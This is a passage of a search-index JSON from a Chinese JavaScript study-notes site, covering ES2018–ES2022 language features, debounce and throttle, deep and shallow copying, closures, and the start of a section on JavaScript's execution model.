Promise.finally()\",\"slug\":\"_4-3-promise-finally\",\"contents\":[\"无论是成功还是失败，都运行同样的代码，比如隐藏对话框，关闭数据连接\",\"function ajax(){ return new Promise((resolve,reject)=>{ reject(1111) }) } //showloading ajax().then(res=>{ }).catch(err=>{ }).finally(()=>{ //hideloading console.log(\\\"finally\\\") }) \"]},{\"header\":\"4.4 异步遍历器\",\"slug\":\"_4-4-异步遍历器\",\"contents\":[]},{\"header\":\"4.4.1 同步遍历器的问题\",\"slug\":\"_4-4-1-同步遍历器的问题\",\"contents\":[\"function* fn() { yield 1111 yield 2222 } const syncI = fn(); console.log(syncI.next()) console.log(syncI.next()) console.log(syncI.next()) // {value: 1111, done: false} // {value: 2222, done: false} // {value: undefined, done: true} \",\"function* fn() { yield new Promise(resolve=>resolve(\\\"1111\\\")) yield new Promise(resolve=>resolve(\\\"2222\\\")) } const syncI = fn(); syncI.next().value.then(res=>{console.log(res)}) syncI.next().value.then(res=>{console.log(res)}) // 1111 // 2222 \",\"value属性的返回值是一个 Promise 对象，用来放置异步操作。但是这样写很麻烦，不太符合直觉，语义也比较绕\"]},{\"header\":\"4.4.2 异步遍历器生成函数\",\"slug\":\"_4-4-2-异步遍历器生成函数\",\"contents\":[\"Generator 函数返回一个同步遍历器，异步 Generator 函数的作用，是返回一个异步遍历器对象。在语法上，异步 Generator 函数就是 async 函数与 Generator 函数的结合\",\"async function* fn() { yield new Promise(resolve=>resolve(\\\"1111\\\")) yield new Promise(resolve=>resolve(\\\"2222\\\")) } const asyncI = fn(); asyncI.next().then(res=>{ console.log(res) return asyncI.next() }).then(res=>{ console.log(res) return asyncI.next() }).then(res=>{ console.log(res) }) // {value: '1111', done: false} // {value: '2222', done: false} // {value: undefined, done: true} \"]},{\"header\":\"4.4.3 for await of\",\"slug\":\"_4-4-3-for-await-of\",\"contents\":[\"for...of循环用于遍历同步的 Iterator 接口。新引入的for await...of循环，则是用于遍历异步的 Iterator 接口\",\"async function test() { for await (let i of asyncI) { console.log(i) } } test() \"]},{\"header\":\"4.4.4 案例改造\",\"slug\":\"_4-4-4-案例改造\",\"contents\":[\"function timer(t) { return new Promise(resolve => { setTimeout(() => { resolve(t) }, t) }) } async function* fn() { yield timer(1000)//任务1 yield timer(2000)//任务2 yield timer(3000)//任务3 } // 使用一下 for await ...of async function fn1() { for await(const val of fn()) { console.log(\\\"start\\\",Date.now()) console.log(val) console.log(\\\"end\\\",Date.now()) } } fn1() \"]},{\"header\":\"5. ES10\",\"slug\":\"_5-es10\",\"contents\":[]},{\"header\":\"5.1 Object.fromEntries\",\"slug\":\"_5-1-object-fromentries\",\"contents\":[\"Object.fromEntries()方法允许你轻松地将键值对列表转换为对象\",\"const arr = [[\\\"name\\\", \\\"kerwin\\\"], [\\\"age\\\", 100]] console.log(Object.fromEntries(arr))//{name: 'kerwin', age: 100} const m = new Map() m.set(\\\"name\\\",\\\"tiechui\\\") m.set(\\\"age\\\",18) console.log(Object.fromEntries(m))//{name: 'tiechui', age: 18} \",\"用处\",\"let str =\\\"name=kerwin&age=100\\\" let searchParams = new URLSearchParams(str) console.log(Object.fromEntries(searchParams))//{name: 'kerwin', age: '100'} \"]},{\"header\":\"5.2 trimStart()andtrimEnd()\",\"slug\":\"_5-2-trimstart-andtrimend\",\"contents\":[\"trimStart()和trimEnd()方法在实现与trimLeft()和trimRight()相同\",\"let str = \\\" kerwin \\\" console.log(\\\"|\\\"+str.trimStart(str)+\\\"|\\\") // |kerwin | console.log(\\\"|\\\"+str.trimEnd(str)+\\\"|\\\") // | kerwin| console.log(\\\"|\\\"+str.trimLeft(str)+\\\"|\\\") // |kerwin | console.log(\\\"|\\\"+str.trimRight(str)+\\\"|\\\") // | kerwin| \"]},{\"header\":\"5.3 Symbol对象的description属性\",\"slug\":\"_5-3-symbol对象的description属性\",\"contents\":[\"为Symbol对象添加了只读属性description，该对象返回包含Symbol描述的字符串\",\"let s = Symbol(\\\"kerwin\\\") console.log(s.description) //kerwin \"]},{\"header\":\"5.4 可选的catch\",\"slug\":\"_5-4-可选的catch\",\"contents\":[\"let pro1 = new Promise(function (resolve, reject) { //执行器函数 setTimeout(() => { resolve(\\\"成功的结果\\\") }, 30000) }) let pro2 = new Promise(function (resolve, reject) { //执行器函数 setTimeout(() => { reject() }, 2000) }) async function test() { try { await Promise.race([pro1, pro2]) } catch { console.log(\\\"不关心错误结果，网络超时\\\") } } test() \"]},{\"header\":\"6. ES11\",\"slug\":\"_6-es11\",\"contents\":[]},{\"header\":\"6.1 Promise.allSettled\",\"slug\":\"_6-1-promise-allsettled\",\"contents\":[\"Promise.allSettled() 方法返回一个在所有给定的 promise 都已经 fulfilled 或 rejected 后的 promise ，并带有一个对象数组，每个对象表示对应的 promise 结果\",\"const promises = [ ajax('/200接口'), ajax('/401接口') ]; Promise.allSettled(promises).then(results=>{ // 过滤出成功的请求 results.filter(item =>item.status === 'fulfilled'); 过滤出失败的请求 results.filter(item=> item.status === 'rejected'); }) \"]},{\"header\":\"6.2 module新增\",\"slug\":\"_6-2-module新增\",\"contents\":[]},{\"header\":\"6.2.1 动态导入import()\",\"slug\":\"_6-2-1-动态导入import\",\"contents\":[\"标准用法的 import 导入的模块是静态的，会使所有被导入的模块，在加载时就被编译（无法做到按需编译，降低首页加载速度）。有些场景中，你可能希望根据条件导入模块或者按需导入模块，这时你可以使用动态导入代替静态导入\",\"例：\",\"<body> <button>login</button> <script type=\\\"module\\\"> let role1 = \\\"管理员\\\" let role2 = \\\"普通用户\\\" function login(){ return \\\"普通用户\\\" } async function render(role){ if(role===role1){ let res1 = await import(\\\"./1.js\\\") console.log(res1.default) }else{ let res2 = await import(\\\"./2.js\\\") console.log(res2.default) } } let obtn = document.querySelector(\\\"button\\\") obtn.onclick = function(){ let role = login() render(role) } </script> </body> \"]},{\"header\":\"6.2.2 import.meta\",\"slug\":\"_6-2-2-import-meta\",\"contents\":[\"import.meta 会返回一个对象，有一个 url 属性，返回当前模块的url路径，只能在模块内部使用\",\"<script type=\\\"module\\\"> import obj from './1.js' </script> //1.js console.log(import.meta) export default { } \"]},{\"header\":\"6.2.3 export * as obj from 'module'\",\"slug\":\"_6-2-3-export-as-obj-from-module\",\"contents\":[\"//1.js export default { name:'111111' } export function test1(){ } //2.js export default { name:\\\"22222\\\" } export function test2(){ } export * as obj1 from './1.js' //把1.js注入到2.js //html <script type=\\\"module\\\"> import * as obj from './2.js' console.log(obj) </script> \"]},{\"header\":\"6.3 字符串的matchAll方法\",\"slug\":\"_6-3-字符串的matchall方法\",\"contents\":[\"matchAll() 方法返回一个包含所有匹配正则表达式的结果的迭代器。可以使用 for...of 遍历，或者使用展开运算符... 或者 Array.from 转换为数组\",\"例：\",\"let str = ` <ul> <li>1111</li> <li>2222</li> <li>3333</li> <li>4444</li> </ul> ` let reg = /<li>(.*)<\\\\/li>/g console.log(str.match(reg)) //'<li>1111</li>', '<li>2222</li>', '<li>3333</li>', '<li>4444</li>' \",\"let str = ` <ul> <li>1111</li> <li>2222</li> <li>3333</li> <li>4444</li> </ul> ` let reg = /<li>(.*)<\\\\/li>/g let match = null while(match = reg.exec(str)){ console.log(match[0]) console.log(match[1]) } // <li>1111</li> // 1111 // <li>2222</li> // 2222 // <li>3333</li> // 3333 // <li>4444</li> // 4444 \",\"let str = ` <ul> <li>1111</li> <li>2222</li> <li>3333</li> <li>4444</li> </ul> ` let reg = /<li>(.*)<\\\\/li>/g for(let i of str.matchAll(reg)){ console.log(i) } \"]},{\"header\":\"6.4 BigInt\",\"slug\":\"_6-4-bigint\",\"contents\":[\"JavaScript 能够准确表示的整数范围在-253到253之间（不含两个端点），超过这个范围，无法精确表示这个值，这使得 JavaScript 不适合进行科学和金融方面的精确计算\",\"9007199254740992 //9007199254740992 9007199254740993 //9007199254740992 Math.pow(2,53) === Math.pow(2,53)+1 //true \",\"为了与 Number 类型区别，BigInt 类型的数据必须添加后缀n\",\"1234 // 普通整数 1234n // BigInt // BigInt 的运算 1n + 2n // 3n \",\"// BigInt函数 console.log(BigInt(2)) //2n console.log(BigInt(2**53)+BigInt(1)) // 9007199254740993n \"]},{\"header\":\"6.5 globalThis\",\"slug\":\"_6-5-globalthis\",\"contents\":[\"globalThis 提供了一个标准的方式来获取不同环境下的全局 this 对象（也就是全局对象自身）。不像window或者self这些属性，它确保可以在有无窗口的各种环境下正常工作。所以，你可以安心的使用 globalThis，不必担心它的运行环境。为便于记忆，你只需要记住，全局作用域中的 this 就是globalThis\",\"例：es6-shim库\",\"//es6-shim var getGlobal = function () { // the only reliable means to get the global object is // Function('return this')() // However, this causes CSP violations in Chrome apps. if (typeof self !== 'undefined') { return self; } if (typeof window !== 'undefined') { return window; } if (typeof global !== 'undefined') { return global; } throw new Error('unable to locate global object'); }; var globals = getGlobal(); if (!globals.Reflect) { defineProperty(globals, ‘Reflect’, {}, true); } \",\"//以前 var getGlobal = function () { if (typeof self !== 'undefined') { return self; } if (typeof window !== 'undefined') { return window; } if (typeof global !== 'undefined') { return global; } throw new Error('unable to locate global object'); }; let globals = getGlobal() if (globals.document) { console.log(\\\"进行dom操作相关\\\") } else { console.log(\\\"不能进行dom操作\\\") } //现在 if (globalThis.document) { console.log(\\\"进行dom操作相关\\\") } else { console.log(\\\"不能进行dom操作\\\") } \"]},{\"header\":\"6.6 空值合并运算符\",\"slug\":\"_6-6-空值合并运算符\",\"contents\":[\"空值合并运算符??是一个逻辑运算符。当左侧操作数为 null 或 undefined 时，其返回右侧的操作数。否则返回左侧的操作数\",\"let obj = { name:\\\"kerwin\\\", introduction:0 } console.log(obj.introduction || \\\"这个人很懒，什么也没有留下\\\") // 这个人很懒，什么也没有留下 console.log(obj.introduction ?? \\\"这个人很懒，什么也没有留下\\\") // 0 \",\"??和 || 的区别是什么呢?\",\"他们两个最大的区别就是''和0，??的左侧为''或者为0的时候，依然会返回左侧的值\",\"|| 会对左侧的数据进行boolean类型转换，所以''和0会被转换成false，返回右侧的值\"]},{\"header\":\"6.7 可选链操作符\",\"slug\":\"_6-7-可选链操作符\",\"contents\":[\"可选链前面的值如果是null或undefined，则不再执行后面的，之前返回可选链前面的值\",\"let obj = { name:\\\"kerwin\\\", introduction:0, // location:{ // city:\\\"dalian\\\" // } } //如果没有location，之前的写法 console.log(obj && obj.location && obj.location.city) //现在的写法 console.log(obj?.location?.city) \"]},{\"header\":\"7. ES12\",\"slug\":\"_7-es12\",\"contents\":[]},{\"header\":\"7.1 逻辑赋值操作符\",\"slug\":\"_7-1-逻辑赋值操作符\",\"contents\":[\"逻辑赋值操作符??=、&&=、 ||=\",\"let a = true let b = false //a &&= b //false a ||= b ; //true console.log(a) let obj = { name:\\\"kerwin\\\", introduction:0 } obj.introduction = obj.introduction??\\\"很懒\\\" obj.introduction??=\\\"很懒\\\" \"]},{\"header\":\"7.2 数字分隔符\",\"slug\":\"_7-2-数字分隔符\",\"contents\":[\"这个新特性是为了方便程序员看代码而出现的，如果数字比较大，那么看起来就不是那么一目了然\",\"const num= 123456789 \",\"分隔符不仅可以分割十进制，也可以分割二进制或者十六进制的数据，非常好用\",\"const number = 1_000_000_000_000 const binary = 0b1010_0101_1111_1101 const hex = 0xA1_B2_C3 \"]},{\"header\":\"7.3 replaceAll\",\"slug\":\"_7-3-replaceall\",\"contents\":[\"所有匹配都会被替代项替换。模式可以是字符串或正则表达式，而替换项可以是字符串或针对每次匹配执行的函数。并返回一个全新的字符串\",\"const str = \\\"I wish to wish the wish you wish to wish, but if you wish the wish the witch wishes, I won't wish the wish you wish to wish. \\\" const newStr = str.replaceAll(\\\"wish\\\", \\\"kerwin\\\") console.log(newStr) // I kerwin to kerwin the kerwin you kerwin to kerwin, but if you kerwin the kerwin the witch kerwines, I won't kerwin the kerwin you kerwin to kerwin. \"]},{\"header\":\"7.4 Promise.any\",\"slug\":\"_7-4-promise-any\",\"contents\":[\"只要参数实例有一个变成fulfilled状态，包装实例就会变成fulfilled状态；如果所有参数实例都变成rejected状态，包装实例就会变成rejected状态\",\"Promise.any()跟Promise.race()方法很像，只有一点不同，就是Promise.any()不会因为某个 Promise 变成rejected状态而结束，必须等到所有参数 Promise 变成rejected状态才会结束\"]},{\"header\":\"7.5 WeakRef\",\"slug\":\"_7-5-weakref\",\"contents\":[\"在一般情况下，对象的引用是强引用的，这意味着只要持有对象的引用，它就不会被垃圾回收。只有当该对象没有任何的强引用时，垃圾回收才会销毁该对象并且回收该对象所占的内存空间\",\"而 WeakRef 允许您保留对另一个对象的弱引用，而不会阻止被弱引用对象被垃圾回收\",\"let target = {} let wr = new WeakRef(target) \",\"WeakRef 实例对象有一个deref()方法，如果原始对象存在，该方法返回原始对象；如果原始对象已经被垃圾回收机制清除，该方法返回undefined\",\"let target = {} let wr = new WeakRef(target) let obj = wr.deref() if (obj) { // target 未被垃圾回收机制清除 // ... } \",\"let like = new WeakRef(document.getElementById(\\\"like\\\")) let mymap = new WeakMap() mymap.set(like.deref(), { click: 0 }) like.deref().onclick = function () { let times = mymap.get(like.deref()) times.click++ } setTimeout(() => { document.body.removeChild(like.deref()) }, 2000) \"]},{\"header\":\"7.6 FinalizationRegistry\",\"slug\":\"_7-6-finalizationregistry\",\"contents\":[\"清理器注册表功能 FinalizationRegistry，用来指定目标对象被垃圾回收机制清除以后，所要执行的回调函数\",\"首先，新建一个注册表实例\",\"const registry = new FinalizationRegistry(data => { // .... }) \",\"registry.register(obj, \\\"some value\\\") registry.unregister(obj) \",\"let like = new WeakRef(document.getElementById(\\\"like\\\")) let mymap = new WeakMap() mymap.set(like.deref(), { click: 0 }) like.deref().onclick = function () { let times = mymap.get(like.deref()) times.click++ } setTimeout(() => { // registry.register(document.getElementById(\\\"like\\\"), mymap.get(like.deref())); registry.register(like.deref(), mymap.get(like.deref())); document.body.removeChild(like.deref()) }, 2000) const registry = new FinalizationRegistry(data => { // .... console.log(\\\"被销毁了\\\", data) }) \"]},{\"header\":\"8. ES13\",\"slug\":\"_8-es13\",\"contents\":[]},{\"header\":\"8.1 私有属性和方法\",\"slug\":\"_8-1-私有属性和方法\",\"contents\":[\"class Cache{ #obj ={} get(key){ return this.#obj[key] } set(key,value){ this.#obj[key] =value } } let cache = new Cache() cache.set(\\\"name\\\",\\\"kerwin\\\") \"]},{\"header\":\"8.2 静态成员的私有属性和方法\",\"slug\":\"_8-2-静态成员的私有属性和方法\",\"contents\":[\"我们还可以给类定义静态成员和静态私有函数。类的静态方法可以使用this关键字访问其他的私有或者公有静态成员\",\" class Cache{ static #count = 0; static getCount(){ return this.#count } #obj ={} get(key){ return this.#obj[key] } set(key,value){ this.#obj[key] =value } } let cache = new Cache() cache.set(\\\"name\\\",\\\"kerwin\\\") console.log(Cache.getCount()) \"]},{\"header\":\"8.3 静态代码块\",\"slug\":\"_8-3-静态代码块\",\"contents\":[\"ES13允许在类中通过static关键字定义一系列静态代码块，这些代码块只会在类被创造的时候执行一次。这其实有点像一些其他的如C#和Java等面向对象的编程语言的静态构造函数的用法\",\"一个类可以定义任意多的静态代码块，这些代码块会和穿插在它们之间的静态成员变量一起按照定义的顺序在类初始化的时候执行一次。我们还可以使用super关键字来访问父类的属性\",\" class Cache{ static obj = new Map() static { this.obj.set(\\\"name\\\",\\\"kerwin\\\") this.obj.set(\\\"age\\\",100) } static{ console.log(this.obj) } } console.log(Cache.obj) \"]},{\"header\":\"8.4 使用in来判断某个对象是否拥有某个私有属性\",\"slug\":\"_8-4-使用in来判断某个对象是否拥有某个私有属性\",\"contents\":[\"class Cache { #obj = {} get(key) { return this.#obj[key] } set(key, value) { this.#obj[key] = value } hasObj(){ return #obj in this } } let cache = new Cache() console.log(cache.hasObj()) \"]},{\"header\":\"8.5 支持在最外层写await\",\"slug\":\"_8-5-支持在最外层写await\",\"contents\":[\"顶层await只能用在 ES6 模块，不能用在 CommonJS 模块。这是因为 CommonJS 模块的require()是同步加载，如果有顶层await，就没法处理加载了\",\"<script type=\\\"module\\\"> function ajax() { return new Promise((resolve) => { setTimeout(() => { resolve(\\\"data-1111\\\"); }, 1000); }) } let res = await ajax(); console.log(res) </script> \"]},{\"header\":\"8.6 at函数来索引元素\",\"slug\":\"_8-6-at函数来索引元素\",\"contents\":[\"let arr = [\\\"kerwin\\\",\\\"tiechui\\\",\\\"gangdan\\\",\\\"xiaoming\\\"] console.log(arr[1]) console.log(arr[arr.length-1]) console.log(arr[arr.length-2]) console.log(arr.at(1)) console.log(arr.at(-1)) console.log(arr.at(-2)) \"]},{\"header\":\"8.7 正则匹配的开始和结束索引\",\"slug\":\"_8-7-正则匹配的开始和结束索引\",\"contents\":[\"// d let str = \\\"今天是2022-11-10\\\" let reg = /(?<year>[0-9]{4})-(?<month>[0-9]{2})-(?<day>[0-9]{2})/d //exec let res = reg.exec(str) console.log(res) \"]},{\"header\":\"8.8 findLast()和findLastIndex()函数\",\"slug\":\"_8-8-findlast-和findlastindex-函数\",\"contents\":[\"let arr = [11,12,13,14,15] // let res = arr.find(function(value){ // return value % 2 === 0 // }) // let res = arr.findIndex(function(value){ // return value % 2 === 0 // }) // let res = arr.findLast(function(value){ // return value % 2 === 0 // }) let res = arr.findLastIndex(function(value){ return value % 2 === 0 }) console.log(res) \"]},{\"header\":\"8.9 Error对象的Cause属性\",\"slug\":\"_8-9-error对象的cause属性\",\"contents\":[\"Error对象多了一个cause属性来指明错误出现的原因。这个属性可以帮助我们为错误添加更多的上下文信息，从而帮助使用者们更好地定位错误\",\"function getData(){ try{ console.log(kerwin) } catch(e){ throw new Error('New error 1111111',{cause:\\\"这是因为,,,,,,,,,\\\"}) } } try{ getData() }catch(e){ console.log(e.cause) } \"]}]},\"/front-end/javascript-notes/27-JavaScript-%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96.html\":{\"title\":\"性能优化\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"防抖（Debounce）和节流（Throttle）都是在处理 JavaScript 事件时常用的技术，用于限制事件的触发频率。它们可以提高用户体验，减少不必要的资源消耗\"]},{\"header\":\"1. 防抖 (debounce)\",\"slug\":\"_1-防抖-debounce\",\"contents\":[\"防抖，就是指触发事件后在 n 秒内函数只能执行一次，如果在 n 秒内又触发了事件，则会重新计算函数执行时间，也就是说，对于高频触发的事件，我们只在最后一次触发的时候来执行需要的操作\",\"常用场景：\",\"用户输入：比如搜索框的自动补全功能，在用户输入期间，可以使用防抖来延迟发送请求，避免频繁请求后端接口\",\"浏览器窗口调整：当浏览器窗口调整大小时，触发的 resize 事件可能会非常频繁。利用防抖可以限制事件触发的频率，例如只在最后一次调整完成后重新布局页面\",\"按钮点击：当用户点击按钮时，可使用防抖来确保按钮被点击的间隔时间超过指定的时间，防止误操作或者连续多次点击\",\"例如：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Document</title> </head> <body> <input type=\\\"text\\\" /> <script> let oInput = document.querySelector('input'); oInput.oninput = function () { console.log(this.value); }; </script> </body> </html> \",\"我们在input框输入时，会频繁地打印每个字符，这时我们可以使用防抖来解决\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Document</title> </head> <body> <input type=\\\"text\\\" /> <script> let oInput = document.querySelector('input'); let timer = null; oInput.oninput = function () { if (timer != null) { clearTimeout(timer); } timer = setTimeout(() => { console.log(this.value); }, 1000); } </script> </body> </html> \",\"这样就可以实现防抖了，但是我们可以用闭包优化一下\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Document</title> </head> <body> <input type=\\\"text\\\" /> <script> let oInput = document.querySelector('input'); oInput.oninput = debounce(function () { console.log(this.value); }, 1000); // 手写防抖函数 // 核心是利用setTimeout定时器来实现 // 1.声明定时器变量 // 2.每次事件触发的时候都要先判断是否有定时器，如果有，先清除以前的定时器 // 3.如果没有定时器，则开启定时器，存入到定时器变量里面 // 4.定时器里面写函数调用(注意this指向) function debounce(fn, delay) { let timer = null; return function () { if (timer != null) { clearTimeout(timer); //关闭定时器 } timer = setTimeout(() => { // 重新计时 fn.call(this); }, delay); } } </script> </body> </html> \",\"我们还可以使用lodash库实现防抖\",\"语法：_.debounce(fun,时间)\"]},{\"header\":\"2. 节流 (throttle)\",\"slug\":\"_2-节流-throttle\",\"contents\":[\"节流，就是指连续触发事件但是在 n 秒中只执行一次函数，也就是说，在规定时间里面就让它执行一次操作\",\"常用场景：\",\"滚动事件：当用户滚动页面时，触发的 scroll 事件可能会非常频繁。利用节流可以限制事件触发的频率，例如每隔一段时间执行一次回调函数，以减少事件处理的次数\",\"鼠标移动：当用户在页面上进行鼠标移动时，可能会触发大量的 mousemove 事件。使用节流可以减少回调函数的调用次数，提高性能\",\"自动加载：当页面滚动到底部时，可以利用节流来限制触发加载更多数据的频率，避免过于频繁地发送请求\",\"例如：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Document</title> <style> body { height: 2000px; } </style> </head> <body> <script> window.onscroll = function () { alert('这是广告！'); } </script> </body> </html> \",\"当我们滑动滚动条时，就会频繁触发弹框，我们使用节流来优化：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Document</title> <style> body { height: 2000px; } </style> </head> <body> <script> window.onscroll = throttle(function () { alert('这是广告！'); }, 2000); // 手写一个节流函数---每隔delay时间触发一次 // 核心是利用setTimeout定时器来实现 // 当函数第一次触发时，不会立即执行，而是开启一个定时器，并打上一个标志位，当函数在一段时间内再次被触发时，发现标志位则忽略本次触发，直至计时结束 function throttle(fn, delay) { let flag = false; return function () { if (flag) { return; // 若进行中，则忽略本次触发 } flag = true; // 更改标志位 setTimeout(() => { fn.call(this); flag = false; // 执行完毕，还原标志位 }, delay); } } </script> </body> </html> \",\"我们还可以使用lodash库实现节流\",\"语法：_.throttle(fun,时间)\"]}]},\"/front-end/javascript-notes/28-JavaScript-%E6%8B%B7%E8%B4%9D.html\":{\"title\":\"拷贝\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"JS数据类型分为基本类型（string、number、boolean、undefined、null、symbol、bigint）和引用类型（object）\",\"在JavaScript中，基础类型值的复制是直接拷贝一份新的一模一样的数据，这两份数据相互独立，互不影响\",\"例：\",\"let a = 10 let b = a a = 100 console.log(a) // 100 console.log(b) // 10 \",\"JavaScript-拷贝01.png\",\"JavaScript-拷贝02.png\",\"而引用类型值（Object类型）的复制是传递对象的引用（也就是对象所在的内存地址，即指向对象的指针），相当于多个变量指向同一个对象，那么只要其中的一个变量对这个对象进行修改，其他的变量所指向的对象也会跟着修改（因为它们指向的是同一个对象）\",\"例：\",\"let a = [1, 2, 3] let b = a a[0] = 100 console.log(a) //[100,2,3] console.log(b) //[100,2,3] \",\"JavaScript-拷贝03.png\",\"JavaScript-拷贝04.png\",\"浅拷贝和深拷贝只针对引用类型\"]},{\"header\":\"1. 浅拷贝\",\"slug\":\"_1-浅拷贝\",\"contents\":[\"浅拷贝：拷贝的是地址\",\"常见方法：\",\"拷贝对象：Object.assgin() 或展开运算符 {... obj} 拷贝对象\",\"拷贝数组：Array.prototype.concat() 或 [...arr]\",\"如果是简单数据类型拷贝值，引用数据类型拷贝的是地址 (简单理解： 如果是单层对象，没问题，如果有多层就有问题)\",\"直接赋值和浅拷贝的区别：\",\"直接赋值的方法，只要是对象，都会相互影响，因为是直接拷贝对象栈里面的地址\",\"浅拷贝如果是一层对象，不相互影响，如果出现多层对象拷贝会相互影响\",\"浅拷贝的理解：拷贝对象之后，里面的属性值是简单数据类型直接拷贝值，如果属性值是引用数据类型则拷贝的是地址\",\"例：\",\"let a = [1, 2, 3] let b = [...a] a[0] = 100 console.log(a) //[100,2,3] console.log(b) //[1,2,3] \",\"JavaScript-拷贝05.png\",\"JavaScript-拷贝06.png\",\"如果是单层对象，没问题，如果有多层就有问题\",\"例：\",\"let a = [1, 2, 3, [3, 4]] let b = [...a] a[3][1] = 5 console.log(a) //[1,2,3,[3,5]] console.log(b) //[1,2,3,[3,5]] \",\"JavaScript-拷贝07.png\",\"JavaScript-拷贝08.png\"]},{\"header\":\"2. 深拷贝\",\"slug\":\"_2-深拷贝\",\"contents\":[\"深拷贝：拷贝的是对象，不是地址\",\"常见方法：\",\"通过递归实现深拷贝\",\"lodash/cloneDeep\",\"通过JSON.stringify()实现\"]},{\"header\":\"2.1 递归实现深拷贝\",\"slug\":\"_2-1-递归实现深拷贝\",\"contents\":[\"function deepClone(oldData) { if (typeof oldData !== 'object' || oldData == null) { return oldData } let res = oldData instanceof Array ? [] : {} for (let k in oldData) { if (oldData.hasOwnProperty(k)) { res[k] = deepClone(oldData[k]) } } return res } let obj = { name: 'jack', age: 18, hobby: ['swim', 'sing'], fn() { console.log(this.name) }, } let obj2 = deepClone(obj) obj.hobby[0] = 'play' console.log(obj2) console.log(obj) \"]},{\"header\":\"2.2 lodash库里面cloneDeep内部实现深拷贝\",\"slug\":\"_2-2-lodash库里面clonedeep内部实现深拷贝\",\"contents\":[\"<body> <!-- 先引用 --> <script src=\\\"./lodash.min.js\\\"></script> <script> const obj = { uname: 'pink', age: 18, hobby: ['乒乓球', '足球'], family: { baby: '小pink' } } const o = _.cloneDeep(obj) console.log(o) o.family.baby = '老pink' console.log(obj) </script> </body> \"]},{\"header\":\"2.3 通过JSON.stringify()实现\",\"slug\":\"_2-3-通过json-stringify-实现\",\"contents\":[\"let a = [1, 2, 3, [3, 4, { name: 'jack' }]] let b = JSON.parse(JSON.stringify(a)) a[3][1] = 5 a[3][2] = 'bob' console.log(a) // [1,2,3,[3,5,{name:'bob'}]] console.log(b) // [1,2,3,[3,4,{name:'jack'}]] \",\"但是这个方法不能拷贝函数，如果里面有函数，则函数无法被拷贝\"]}]},\"/front-end/javascript-notes/29-JavaScript-%E9%97%AD%E5%8C%85.html\":{\"title\":\"闭包\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"概念：一个函数对周围状态的引用捆绑在一起，内层函数中访问到其外层函数的作用域\",\"闭包是一种比较特殊的函数，它的核心作用是：\",\"使用闭包能够访问函数作用域中的变量\",\"使变量可以驻留在内存，不被回收\",\"首先我们先看一下函数的作用：\",\"避免变量全局污染\",\"使数据私有化，外部无法修改内部数据\",\"可以让外部可以使用内部的私有数据\",\"我们来看个例子：\",\"let a = 10 function fn() { a++ console.log(a) } fn() fn() fn() \",\"上述代码中，输出结果为：\",\"11 12 13 \",\"此时如果a不小心被修改了，输出结果将改变：\",\"let a = 10 a = 100 function fn() { a++ console.log(a) } fn() \",\"此时结果会变成：\",\"101 \",\"为了避免a被污染，我们可以把a放到函数里面：\",\"a = 100 function fn() { let a = 10 a++ console.log(a) } fn() //结果为11 \",\"上面是普通函数就拥有的作用\",\"但是如果我们将上面的代码中的fn再执行两遍，结果就不是我们想要的了：\",\"a = 100 function fn() { let a = 10 a++ console.log(a) } fn() //结果为11 fn() //结果为11 fn() //结果为11 \",\"这是因为每次fn执行完，里面的a都会被释放掉，再执行时a又会被赋值为10\",\"我们可以使用闭包来解决这个问题：\",\"a = 100 function fn() { let a = 10 return function(){ a++ console.log(a) } } // 形成闭包 let f = fn() // 执行这个函数即可创建一个闭包 f() // 11 f() // 12 f() // 13 f = null // 为了防止内存泄漏，我们可以手动清除 \",\"总结：\",\"怎么理解闭包？\",\"闭包 = 内层函数 + 引用的外层函数的变量\",\"例如：\",\"function fn(){ const a = 1 fucntion f(){ console.log(a) } f() } fn() \",\"function fn(){ const a = 1 return fucntion (){ console.log(a) } } fn() \",\"闭包不一定要有return\",\"当我们想让外部变量使用我们闭包里面的变量时，可以用return\",\"闭包可能引起的问题？\",\"内存泄漏\"]}]},\"/front-end/javascript-notes/30-JavaScript-%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6.html\":{\"title\":\"执行机制\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"JavaScript 语言的一大特点就是单线程，也就是说，同一时间只能做一件事\",\"这是因为 JavaScript 这门脚本语言诞生的使命所致——JavaScript 是为处理页面中用户的交互，以及操作 DOM 而诞生的。比如我们对某个 DOM 元素进行添加和删除操作，不能同时进行。应该先进行添加，然后再删除\",\"单线程就意味着，所有任务需要排队，前一个任务结束，才会执行后一个任务。这样导致的问题是：如果 JS 执行的时间过长，这样就会造成页面的渲染不连贯，导致页面渲染加载阻塞的感觉\",\"为了解决这个问题，利用多核 CPU 的计算能力，HTML 提出 Web Worker 标准，允许 JavaScript 脚本创建多个线程。于是，JS 中出现了同步和异步\"]},{\"header\":\"1. 同步和异步\",\"slug\":\"_1-同步和异步\",\"contents\":[\"前一个任务结束后再执行后一个任务，程序的执行顺序与任务的排列顺序是一致的、同步的。比如做饭的同步做法：我们要烧水做饭，等水开了（十分钟后），再去切菜、炒菜\",\"在做一件事情时，因为这件事情会花费很长时间，在做这件事的同时，你还可以去处理其他事情。比如做饭的异步做法：我们在烧水的同时，利用这十分钟去切菜、炒菜\",\"它们的本质区别：这条流水线上各个流程的执行顺序不同\"]},{\"header\":\"1.1 